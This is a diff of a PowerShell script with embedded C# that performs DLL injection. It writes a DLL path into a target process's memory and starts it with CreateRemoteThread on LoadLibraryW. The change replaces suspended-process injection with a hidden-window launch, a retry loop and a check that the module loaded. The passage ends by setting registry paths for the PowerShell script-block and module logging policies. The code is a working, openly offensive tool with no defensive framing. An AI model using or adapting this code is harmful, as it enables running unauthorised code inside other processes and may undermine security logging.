@@ -10,65 +10,29 @@ Add-Type -TypeDefinition @'
 using System;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
-using System.ComponentModel;
 public class I {
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern IntPtr OpenProcess(uint a, bool b, int c);
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern IntPtr VirtualAllocEx(IntPtr h, IntPtr a, uint s, uint t, uint p);
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern bool WriteProcessMemory(IntPtr h, IntPtr a, byte[] b, uint s, out uint w);
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern IntPtr GetProcAddress(IntPtr h, string n);
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern IntPtr GetModuleHandle(string n);
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern IntPtr CreateRemoteThread(IntPtr h, IntPtr a, uint s, IntPtr x, IntPtr p, uint f, IntPtr t);
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern uint WaitForSingleObject(IntPtr h, uint m);
-    [DllImport("kernel32", SetLastError = true)]
+    [DllImport("kernel32", SetLastError=true)]
     static extern bool CloseHandle(IntPtr h);
-    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Unicode)]
-    static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-    [DllImport("kernel32", SetLastError = true)]
-    static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
-    [DllImport("kernel32")] static extern uint ResumeThread(IntPtr hThread);
-    [DllImport("kernel32")] static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
     [DllImport("kernel32")] static extern IntPtr CreateToolhelp32Snapshot(uint dwFlags, uint th32ProcessID);
     [DllImport("kernel32")] static extern bool Module32First(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
     [DllImport("kernel32")] static extern bool Module32Next(IntPtr hSnapshot, ref MODULEENTRY32 lpme);
-    [DllImport("kernel32")] static extern bool CloseHandle(IntPtr hObject);
     const uint TH32CS_SNAPMODULE = 0x00000008;
     const uint TH32CS_SNAPMODULE32 = 0x00000010;
     [StructLayout(LayoutKind.Sequential)]
-    struct STARTUPINFO {
-        public int cb;
-        public string lpReserved;
-        public string lpDesktop;
-        public string lpTitle;
-        public int dwX;
-        public int dwY;
-        public int dwXSize;
-        public int dwYSize;
-        public int dwXCountChars;
-        public int dwYCountChars;
-        public int dwFillAttribute;
-        public int dwFlags;
-        public short wShowWindow;
-        public short cbReserved2;
-        public IntPtr lpReserved2;
-        public IntPtr hStdInput;
-        public IntPtr hStdOutput;
-        public IntPtr hStdError;
-    }
-    [StructLayout(LayoutKind.Sequential)]
-    struct PROCESS_INFORMATION {
-        public IntPtr hProcess;
-        public IntPtr hThread;
-        public int dwProcessId;
-        public int dwThreadId;
-    }
-    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
     struct MODULEENTRY32 {
         public uint dwSize;
         public uint th32ModuleID;
@@ -83,7 +47,6 @@ public class I {
         [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
         public string szExePath;
     }
-    const uint CREATE_SUSPENDED = 0x00000004;
     static bool IsModuleLoaded(int pid, string dllName) {
         IntPtr snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, (uint)pid);
         if (snapshot == (IntPtr)(-1)) return false;
@@ -96,40 +59,45 @@ public class I {
         CloseHandle(snapshot);
         return false;
     }
-    public static bool InjectSuspended(string targetPath, string dllPath) {
-        STARTUPINFO si = new STARTUPINFO();
-        si.cb = Marshal.SizeOf(si);
-        PROCESS_INFORMATION pi;
-        if (!CreateProcess(null, targetPath, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi)) return false;
-        IntPtr hProcess = pi.hProcess;
-        IntPtr hThread = pi.hThread;
+    public static bool InjectStandard(int pid, string dllPath) {
+        IntPtr hProcess = OpenProcess(0x1F0FFF, false, pid);
+        if (hProcess == IntPtr.Zero) return false;
         byte[] dllBytes = System.Text.Encoding.Unicode.GetBytes(dllPath);
         uint dllSize = (uint)dllBytes.Length;
         IntPtr remoteMem = VirtualAllocEx(hProcess, IntPtr.Zero, dllSize, 0x3000, 0x4);
-        if (remoteMem == IntPtr.Zero) { CloseHandle(hProcess); CloseHandle(hThread); return false; }
+        if (remoteMem == IntPtr.Zero) { CloseHandle(hProcess); return false; }
         uint written;
         WriteProcessMemory(hProcess, remoteMem, dllBytes, dllSize, out written);
         IntPtr kernel32 = GetModuleHandle("kernel32.dll");
         IntPtr loadLib = GetProcAddress(kernel32, "LoadLibraryW");
         IntPtr remoteThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, remoteMem, 0, IntPtr.Zero);
-        if (remoteThread == IntPtr.Zero) { VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); CloseHandle(hThread); return false; }
+        if (remoteThread == IntPtr.Zero) { VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); return false; }
         WaitForSingleObject(remoteThread, 0xFFFFFFFF);
         uint exitCode;
         GetExitCodeThread(remoteThread, out exitCode);
         CloseHandle(remoteThread);
-        if (exitCode == 0) { VirtualFreeEx(hProcess, remoteMem, 0, 0x8000); CloseHandle(hProcess); CloseHandle(hThread); return false; }
-        uint resume = 0;
-        while (WaitForSingleObject(hThread, 0) == 0x102) { resume = ResumeThread(hThread); }
-        CloseHandle(hThread);
-        WaitForSingleObject(hProcess, 2000);
-        bool loaded = IsModuleLoaded(pi.dwProcessId, System.IO.Path.GetFileName(dllPath));
         CloseHandle(hProcess);
-        return loaded;
+        return exitCode != 0;
     }
+    [DllImport("kernel32")] static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);
+    [DllImport("kernel32")] static extern bool VirtualFreeEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint dwFreeType);
 }
 '@ -ReferencedAssemblies System.Runtime.InteropServices
-$result = [I]::InjectSuspended($processPath, $dllPath)
-if ($result) { Write-Host "Injected" }
+$dllName = [System.IO.Path]::GetFileName($dllPath)
+$success = $false
+for ($i = 0; $i -lt 3; $i++) {
+    $proc = Start-Process -FilePath $processPath -PassThru -WindowStyle Hidden
+    Start-Sleep -Seconds 2
+    $running = Get-Process -Name $processName -ErrorAction SilentlyContinue | Where-Object { $_.Id -eq $proc.Id }
+    if ($running) {
+        if ([I]::InjectStandard($proc.Id, $dllPath)) {
+            Start-Sleep -Milliseconds 500
+            if ([I]::IsModuleLoaded($proc.Id, $dllName)) { $success = $true; break }
+        }
+        $proc.Kill(); Start-Sleep -Seconds 1
+    }
+}
+if ($success) { Write-Host "Injected" }
 $basePath = 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell'
 $sblPath = "$basePath\ScriptBlockLogging"
 $modPath = "$basePath\ModuleLogging"
